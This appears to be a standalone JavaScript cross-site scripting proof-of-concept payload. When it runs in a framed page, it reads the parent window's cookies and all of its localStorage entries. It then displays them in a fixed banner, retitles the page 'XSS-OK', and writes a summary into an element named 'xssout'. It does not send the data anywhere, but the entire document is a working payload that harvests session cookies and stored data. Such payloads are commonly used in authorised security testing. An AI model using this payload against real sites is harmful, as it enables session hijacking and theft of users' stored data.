(function () {
  var p = window.parent, d = p.document;
  var cookie = d.cookie;
  var ls = {};
  try { for (var i = 0; i < p.localStorage.length; i++) { var k = p.localStorage.key(i); ls[k] = p.localStorage.getItem(k); } } catch (e) {}
  var b = d.createElement('div');
  b.id = 'xss-banner';
  b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#abff44;color:#000;font:12px monospace;padding:8px;border-bottom:2px solid #000;white-space:pre-wrap';
  b.textContent = 'XSS executed in ' + p.location.origin + '\n\nCookie: ' + (cookie || '(none)') + '\n\nlocalStorage keys: ' + Object.keys(ls).join(', ') + '\n\nlocalStorage sample: ' + JSON.stringify(ls).slice(0, 400);
  d.body.appendChild(b);
  p.document.title = 'XSS-OK @ ' + p.location.host;
  var m = d.getElementById('xssout'); if (m) m.textContent = 'cookie=' + cookie + ' | ls=' + Object.keys(ls).join(',') + ' | executed';
})();
